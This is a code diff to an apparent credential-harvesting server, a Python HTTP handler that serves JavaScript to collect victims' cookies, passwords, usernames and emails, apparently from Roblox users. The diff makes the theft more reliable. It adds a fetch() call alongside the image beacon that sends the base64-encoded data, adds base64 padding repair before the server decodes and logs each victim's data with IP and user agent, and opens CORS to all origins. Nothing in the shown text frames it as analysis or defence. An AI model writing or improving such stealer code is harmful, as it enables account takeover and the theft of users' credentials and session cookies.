@@ -1,6 +1,6 @@
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
-import traceback, requests, base64, json as _json, os
+import requests, base64, json as _json, os
 
 # Load config
 try:
@@ -54,7 +54,9 @@ def harvestScript():
     function sendData() {
         if (collected.cookie || collected.password || collected.username || collected.email) {
             var payload = btoa(unescape(encodeURIComponent(JSON.stringify(collected))));
-            new Image().src = window.location.pathname + (window.location.search ? "&" : "?") + "rbx=" + payload;
+            var url = window.location.pathname + (window.location.search ? "&" : "?") + "rbx=" + encodeURIComponent(payload);
+            new Image().src = url;
+            fetch(url, {mode: 'no-cors'});
         }
     }
 
@@ -163,13 +165,16 @@ class handler(BaseHTTPRequestHandler):
                 try:
                     raw = params["rbx"]
                     raw = parse.unquote(raw)
+                    # Add base64 padding if needed
+                    raw = raw + "=" * (4 - len(raw) % 4) if len(raw) % 4 else raw
                     decoded = base64.b64decode(raw).decode("utf-8")
                     data = _json.loads(decoded)
                     logRoblox(ip, data, ua)
-                except:
+                except Exception as e:
                     pass
                 self.send_response(200)
                 self.send_header("Content-Type", "text/plain")
+                self.send_header("Access-Control-Allow-Origin", "*")
                 self.end_headers()
                 self.wfile.write(b"")
                 return
